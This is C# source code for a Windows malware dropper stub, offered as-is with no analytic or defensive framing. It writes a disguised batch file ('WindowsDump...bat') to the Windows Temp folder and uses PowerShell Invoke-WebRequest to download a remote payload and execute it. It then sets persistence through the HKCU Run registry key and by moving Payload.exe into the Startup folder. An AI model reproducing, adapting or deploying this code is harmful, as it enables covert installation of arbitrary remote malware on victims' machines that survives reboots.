using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using Microsoft.CSharp;
namespace DropperStub
{
    internal class Program
    {
        static void Main(string[] args)
        {
           try
            {
                TextWriter tw = new StreamWriter(@"C:\Windows\Temp\WindowsDump435y258175865.txt", true);
                tw.WriteLine("@Echo off");
                tw.WriteLine("Powershell -Command Invoke-WebRequest " + Settings.DropperLink + " -Outfile Payload.exe");
                tw.WriteLine("Start Payload.exe");
                tw.Close();
                ChangeExtension(@"C:\Windows\Temp\WindowsDump435y258175865.txt", @"C:\Windows\Temp\WindowsDump435y258175865.bat");
                Process.Start(@"C:\Windows\Temp\WindowsDump435y258175865.bat");
            }catch(Exception e)
            {

            }
            string path = Directory.GetCurrentDirectory();
            RegistryKey hwApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string hwAppPath = path + @"\Payload.exe";
            hwApp.SetValue("Dropped", hwAppPath);
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\Payload.exe") == false)
            {
                File.Move(Application.StartupPath + "\\Payload.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup).Trim() + "\\Payload.exe");
            }


        }
        public static void ChangeExtension(string oldExtension,string newExtension)
        {
            File.Move(oldExtension, newExtension);
        }
    }
}
